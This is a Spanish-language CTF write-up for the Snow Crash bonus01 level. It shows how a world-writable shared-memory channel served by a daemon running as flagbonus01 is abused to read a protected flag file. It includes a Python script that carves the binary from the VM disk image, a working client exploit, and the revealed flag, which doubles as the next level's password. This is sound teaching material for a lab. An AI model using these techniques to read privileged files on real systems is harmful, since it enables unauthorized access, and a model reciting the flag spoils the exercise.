# Bonus01 — Snow Crash

> **Nivel bonus** · Shared memory · Daemon `ng` · Magic `0x13370042` · Polling IPC

| | |
|---|---|
| **Proyecto** | Snow Crash (42) |
| **Nivel** | `bonus01` |
| **Usuario de entrada** | `bonus01` |
| **Objetivo** | Credencial de `flagbonus01` |
| **Idea central** | Canal `/dev/shm/ng_channel` + magic de petición |

---

<a id="indice"></a>

## 📋 Índice

1. 🧭 [¿De qué va este nivel? (visión general)](#sec-1)
2. 🗺️ [Mapa mental del ataque](#sec-2)
3. 📖 [Glosario rápido](#sec-3)
4. 🏷️ [Tipo de ejercicio](#sec-4)
5. 🎯 [Objetivo](#sec-5)
6. 🔑 [Acceso al nivel](#sec-6)
7. 🔍 [Localizar el componente del nivel](#sec-7)
8. ⚙️ [Identificar el servicio systemd](#sec-8)
9. 📡 [Comportamiento del canal (reconocimiento)](#sec-9)
10. 🔬 [Obtener el binario cuando no es legible](#sec-10)
11. 🧩 [Protocolo (análisis de main)](#sec-11)
12. ✅ [Cliente mínimo y flag](#sec-12)
13. 🏁 [Credencial final](#sec-13)
14. ⌨️ [Resumen de comandos válidos](#sec-14)
15. 💡 [Conceptos importantes](#sec-15)
16. 📦 [Conclusión](#sec-16)
17. 📁 [Estructura recomendada en el repositorio](#sec-17)
18. 📚 [Para seguir aprendiendo](#sec-18)
19. 🩹 [Errores frecuentes y qué significan](#sec-err)

> **Tip de navegación:** al final de cada sección encontrarás un enlace **↑ Volver al índice**.

---

<a id="sec-1"></a>

## 1. 🧭 ¿De qué va este nivel? (visión general)

Imagina un **buzón compartido** en un pasillo del edificio (`/dev/shm/ng_channel`).
Cualquiera puede dejar o leer papeles en ese buzón. Un **conserje** con llaves
del despacho del jefe (`flagbonus01`) revisa el buzón cada dos segundos. Si
encuentra un sobre con el **código postal correcto** (un número mágico), fotocopia
el documento secreto del despacho y lo deja en una **casilla fija** del mismo
buzón (offset 12).

Eso es, en esencia, bonus01:

1. El servicio `ng` corre como `flagbonus01` y publica un canal de 64 bytes world-writable.
2. Tú no puedes ejecutar ni leer el binario `ng`, pero sí escribir en el canal.
3. Escribes el magic `0x13370042` (little-endian) al inicio.
4. Tras el siguiente ciclo de poll, lees la flag a partir del offset `0x0C`.

No hace falta ser experto en IPC: basta con seguir los pasos y, si aparece un
término nuevo, mirar el [glosario](#sec-3).

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-2"></a>

## 2. 🗺️ Mapa mental del ataque

```text
  [tú: bonus01]
        │  1. abres /dev/shm/ng_channel (O_RDWR)
        │  2. escribes 4 bytes LE: 0x13370042
        ▼
  ┌─────────────────────────────────┐
  │  /dev/shm/ng_channel  (64 B)    │  modo 0666
  └─────────────┬───────────────────┘
                │  ng (User=flagbonus01) hace sleep(2)
                ▼
         ¿magic == 0x13370042?
                │ sí
                ▼
         fopen("/home/flagbonus01/.flag")
         fgets → escribe en offset 0x0C
         limpia magic en offset 0
                │
                ▼
  [tú] lees data[12:]  →  flag legible
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-3"></a>

## 3. 📖 Glosario rápido

| Término | Analogía cotidiana | Qué es en la práctica |
|---------|-------------------|------------------------|
| **Shared memory (`/dev/shm`)** | Pizarra compartida en el pasillo | Memoria visible para varios procesos a la vez |
| **POSIX `shm_open`** | Pedir una pizarra por su nombre | Crear/abrir un objeto de memoria compartida |
| **Daemon / servicio** | Conserje que trabaja en bucle | Proceso de larga duración, a menudo bajo `systemd` |
| **Magic number** | Código de un sobre postal | Valor fijo que identifica una petición válida |
| **Little-endian (LE)** | Escribir el número “al revés” byte a byte | En x86 el byte menos significativo va primero en memoria |
| **Offset** | Número de casilla del buzón | Posición en bytes desde el inicio del buffer |
| **Polling** | Mirar el buzón cada 2 segundos | Comprobar periódicamente, sin eventos push |
| **`UMask=0000`** | Quitar el filtro al crear ficheros | El proceso puede crear el canal con modo 0666 |
| **Carve (VDI)** | Buscar una carta dentro de un archivo enorme | Extraer un ELF del disco virtual sin montarlo |
| **Flag / `.flag`** | Documento secreto del nivel | Cadena que sirve de contraseña del siguiente usuario |

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-4"></a>

## 4. 🏷️ Tipo de ejercicio

Explotación de un canal de **memoria compartida POSIX** (`shm`) expuesto por un
daemon `systemd` que retransmite el contenido de un fichero privilegiado.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-5"></a>

## 5. 🎯 Objetivo

Obtener la credencial asociada a `flagbonus01` / al siguiente nivel bonus.

El daemon `ng` se ejecuta como `flagbonus01`, no es ejecutable ni legible por
`bonus01`, y publica un canal world-writable en `/dev/shm/ng_channel`. El
cliente debe hablar el protocolo correcto para que el daemon lea
`/home/flagbonus01/.flag` y escriba la respuesta en el canal.

La pista del home de `bonus01` es:

```text
The New Government broadcasts on all frequencies. Are you listening?
```

*(“New Government” / broadcasts apuntan al componente **NG** y a un canal de
comunicación compartido.)*

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-6"></a>

## 6. 🔑 Acceso al nivel

Desde el equipo anfitrión (puerto reenviado `2424` en esta configuración; el
subject oficial usa `4242`):

```bash
ssh bonus01@localhost -p 2424
```

La contraseña de `bonus01` es la flag del final del recorrido mandatory (o la
que figure en `flags.md` del repositorio).

```bash
whoami
id
pwd
ls -la
cat README
```

Resultado esperado:

```text
bonus01
uid=3001(bonus01) gid=3001(bonus01) groups=3001(bonus01),1001(levelgroup)
/home/bonus01
```

```text
The New Government broadcasts on all frequencies. Are you listening?
```

```bash
getent passwd flagbonus01
```

```text
flagbonus01:x:4001:4001::/home/flagbonus01:/usr/sbin/nologin
```

No se inicia sesión interactiva como `flagbonus01`. La flag se obtiene a través
del servicio que corre con sus privilegios.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-7"></a>

## 7. 🔍 Localizar el componente del nivel

```bash
ls -la /opt/snowcrash/
ls -laR /opt/snowcrash/bonus01
```

```text
/opt/snowcrash/bonus01:
-rwxr-x---  1 flagbonus01 flagbonus01 16936 ... ng
```

`bonus01` **no** puede ejecutarlo ni leerlo:

```bash
ls -l /opt/snowcrash/bonus01/ng
/opt/snowcrash/bonus01/ng
file /opt/snowcrash/bonus01/ng
```

```text
Permission denied
regular file, no read permission
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-8"></a>

## 8. ⚙️ Identificar el servicio systemd

```bash
systemctl list-units --type=service --all | grep -iE 'bonus|ng'
systemctl cat ng.service
systemctl status ng.service --no-pager
```

Definición relevante de `/etc/systemd/system/ng.service`:

```ini
[Unit]
Description=Snow Crash bonus01 — NG shared-memory channel daemon
After=network.target

[Service]
Type=forking
User=flagbonus01
Group=flagbonus01
ExecStart=/opt/snowcrash/bonus01/ng
Restart=always
RestartSec=5
UMask=0000
KillMode=control-group

[Install]
WantedBy=multi-user.target
```

El comentario del unit documenta que el binario crea `/dev/shm/ng_channel` con
modo 0666 y que hace falta `UMask=0000` para que el kernel no aplique un umask
restrictivo.

```bash
ps aux | grep -E '[n]g'
ls -la /dev/shm/
```

```text
flagbon+  ...  /opt/snowcrash/bonus01/ng
-rw-rw-rw-  1 flagbonus01 flagbonus01  64  ...  ng_channel
```

El segmento tiene **64 bytes** y es world-readable y world-writable.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-9"></a>

## 9. 📡 Comportamiento del canal (reconocimiento)

```bash
xxd /dev/shm/ng_channel
wc -c /dev/shm/ng_channel
```

En reposo el canal está a ceros (64 bytes).

**Importante sobre la escritura**

- Redirecciones de shell (`echo ... >`) y `dd` pueden fallar con `Permission denied`.
- **Python** con `os.open(..., os.O_RDWR)` sí permite escribir.

```bash
python3 - <<'PY'
import os
path = "/dev/shm/ng_channel"
print("R_OK", os.access(path, os.R_OK), "W_OK", os.access(path, os.W_OK))
fd = os.open(path, os.O_RDWR)
os.write(fd, b"TEST\x00")
os.lseek(fd, 0, 0)
print("read back", os.read(fd, 64))
os.close(fd)
PY
```

Escribir texto arbitrario (`LISTEN`, `FLAG`, `HELP`, etc.) **no** provoca una
respuesta del daemon: hace falta el protocolo binario real.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-10"></a>

## 10. 🔬 Obtener el binario cuando no es legible

El análisis se hace **desde el anfitrión**, sobre el VDI, sin `sudo`, tallando
(carve) el ELF.

Localizar el disco:

```bash
find ... -iname '*SnowCrash-disk001.vdi'
```

Buscar una cadena del ejecutable (p. ej. ruta del binario o `ng_channel` *dentro*
del ELF), retroceder hasta la cabecera `\x7fELF` y extraer **16936** bytes a
`/tmp/ng_bin`.

```bash
file /tmp/ng_bin
strings -a /tmp/ng_bin | grep -iE 'flag|shm|channel|/home|poll|relay|ng_'
```

Cadenas relevantes:

```text
/ng_channel
shm_open
/home/flagbonus01/.flag
relay response written
polling loop started (interval: %ds)
sleep
fopen
fgets
```

El daemon es un **relay** de polling. El binario **no está stripped**.

### Script completo de carve (host)

Ajusta la ruta del VDI si en tu máquina difiere:

```bash
python3 << 'EOF'
import mmap, os, sys

candidates = [
    "/home/sternero/sgoinfre/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
    "/sgoinfre/students/sternero/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
]
vdi = next((p for p in candidates if os.path.isfile(p)), None)
if not vdi:
    print("VDI not found — edita la lista candidates")
    sys.exit(1)

needles = [
    b"/opt/snowcrash/bonus01/ng",
    b"/ng_channel",
]
out = "/tmp/ng_bin"
size_guess = 16936
max_back = 500_000

with open(vdi, "rb") as f:
    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
    found = None
    for n in needles:
        pos = 0
        while True:
            pos = mm.find(n, pos)
            if pos < 0:
                break
            start = max(0, pos - max_back)
            elf_rel = mm[start:pos].rfind(b"\x7fELF")
            if elf_rel >= 0:
                elf_off = start + elf_rel
                blob = mm[elf_off:elf_off + size_guess + 8192]
                if b"/ng_channel" in blob or b"shm_open" in blob:
                    print(f"candidate needle={n!r} pos={pos} elf={elf_off}")
                    open(out, "wb").write(mm[elf_off:elf_off + size_guess])
                    found = elf_off
                    break
            pos += 1
        if found is not None:
            break
    mm.close()
    if found is None:
        print("no suitable ELF found")
        sys.exit(1)
    print(f"wrote {size_guess} bytes from {found} -> {out}")

print(open(out, "rb").read(4))  # debe ser b'\\x7fELF'
EOF

file /tmp/ng_bin
strings -a /tmp/ng_bin | grep -iE 'flag|shm|channel|/home|poll|relay'
```

**Analogía del carve:** el VDI es un archivo enorme (como un contenedor de
mudanza cerrado). No hace falta abrirlo con llave de administrador: buscas una
etiqueta conocida (“ng_channel”), das unos pasos atrás hasta encontrar la
puerta del mueble (`\\x7fELF`) y sacas solo ese mueble al pasillo (`/tmp/ng_bin`).


<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-11"></a>

## 11. 🧩 Protocolo (análisis de main)

```bash
objdump -d /tmp/ng_bin | sed -n '/<main>:/,/^$/p' | head -250
```

Bucle de polling (idea):

```text
sleep(2)
leer u32 en offset 0
xor %ah, %ah
cmp $0x13370042
si coincide: fopen(.flag), fgets, copiar a offset 0x0C, limpiar magic
```

### Layout del canal (64 bytes)

| Campo | Offset | Tamaño | Contenido |
|-------|--------|--------|-----------|
| Magic de petición | `0x00` | 4 B | `0x13370042` LE → `42 00 37 13` |
| (reservado) | `0x04` | ~8 B | uso interno |
| Payload de respuesta | `0x0C` | resto | Contenido de `.flag` (string C) |

El magic canónico del cliente es **`0x13370042` little-endian**. Intervalo de
poll: **2 segundos**.

**Ejemplo cotidiano de little-endian:** el número de teléfono “1337” escrito en
un papel “al revés por dígitos de dos en dos” para que la máquina lo lea en su
orden natural. En hex, `0x13370042` se guarda en memoria como los bytes
`42 00 37 13` (primero el “final” del número). Por eso en Python usamos
`struct.pack("<I", 0x13370042)`: el `<` significa little-endian.


<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-12"></a>

## 12. ✅ Cliente mínimo y flag

```bash
python3 << 'EOF'
import os, time, struct

fd = os.open("/dev/shm/ng_channel", os.O_RDWR)
os.write(fd, struct.pack("<I", 0x13370042) + b"\x00" * 60)
time.sleep(3)
os.lseek(fd, 0, 0)
data = os.read(fd, 64)
print(data.hex())
print("FLAG:", data[12:].split(b"\x00")[0].decode())
os.close(fd)
EOF
```

```text
FLAG: fa6v5ateaw21peobuub8ipe6s
```

**Secuencia:** escribes magic → daemon despierta, borra magic, deja flag en
offset 12 → lees `data[12:]`.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-13"></a>

## 13. 🏁 Credencial final

```text
fa6v5ateaw21peobuub8ipe6s
```

Guardar en `bonus01/flag`. Contraseña SSH de `bonus02`:

```bash
ssh bonus02@localhost -p 2424
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-14"></a>

## 14. ⌨️ Resumen de comandos válidos

```bash
ssh bonus01@localhost -p 2424
ls -la; cat README
systemctl cat ng.service
ls -la /dev/shm/ng_channel
# cliente Python: magic 0x13370042 LE + lectura offset 12

# Host: carve VDI → /tmp/ng_bin → strings / objdump
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-15"></a>

## 15. 💡 Conceptos importantes

- POSIX shared memory y `/dev/shm`
- `UMask=0000` en systemd y modos de creación
- Daemon como *relay* privilegiado
- Reverse engineering offline (VDI) cuando el ELF no es legible
- Magic little-endian y offsets fijos
- Polling con `sleep(2)` (sin futex obligatorio)

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-16"></a>

## 16. 📦 Conclusión

No se modifica la OVA. Se usa el canal abierto y el protocolo descubierto al
analizar `ng`. Credencial:

```text
fa6v5ateaw21peobuub8ipe6s
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-17"></a>

## 17. 📁 Estructura recomendada en el repositorio

```text
bonus01/
├── flag
└── resources/
    └── bonus01.md
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-18"></a>

## 18. 📚 Para seguir aprendiendo

| Tema | Pista |
|------|--------|
| Shared memory | `man shm_overview`, `man shm_open` |
| Endianness | `uint32_t` en x86_64 |
| systemd | `man systemd.exec` (`UMask=`) |
| RE básico | `strings`, `objdump` |

Hilo común: *¿quién tiene el privilegio y cómo se le pide que haga el trabajo?*

<p align="right"><a href="#indice">↑ Volver al índice</a></p>


---

<a id="sec-err"></a>

## 19. 🩹 Errores frecuentes y qué significan

Cuando algo “no funciona”, casi siempre el mensaje del sistema apunta a una
causa concreta. Esta tabla resume los síntomas más habituales de **bonus01**,
qué suelen querer decir y el siguiente comando o acción razonable.

| Síntoma | Causa probable | Qué hacer |
|---------|----------------|-----------|
| `Permission denied` al ejecutar `/opt/.../ng` | El binario es `750` y no eres `flagbonus01` | **Normal.** No hace falta ejecutarlo; usa el canal shm. |
| `Permission denied` con `echo`/`dd` al canal | Cómo la shell abre el fichero shm | Usa Python: `os.open(path, os.O_RDWR)`. |
| El canal sigue a ceros tras escribir `LISTEN`/`FLAG` | No es el protocolo: hace falta el **magic** | Escribe `struct.pack("<I", 0x13370042)`. |
| Magic escrito pero no hay flag | Poll aún no ha corrido (`sleep(2)`) | `time.sleep(3)` o más y vuelve a leer. |
| Flag “vacía” o basura | Lectura en offset incorrecto | Lee a partir de **offset 12** (`data[12:]`). |
| `cp: cannot stat '/proc/.../exe'` | No puedes leer el binario del proceso | Analiza el ELF en el **host** (carve del VDI). |
| Carve encuentra otro programa | Aguja demasiado genérica | Ancla a `/opt/snowcrash/bonus01/ng` o validar con `strings` (`shm_open`, `.flag`). |

**Cómo usarla:** localiza la fila que más se parezca a lo que ves en pantalla,
aplica la acción sugerida y, si el síntoma cambia, vuelve a consultar la tabla
(a menudo un error se resuelve y aparece el siguiente de la lista).

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<div align="center">

**42 Málaga** — **rdel-olm & sternero** — **Octubre 2026**

*Snow Crash · bonus01 · material didáctico de resolución*

</div>
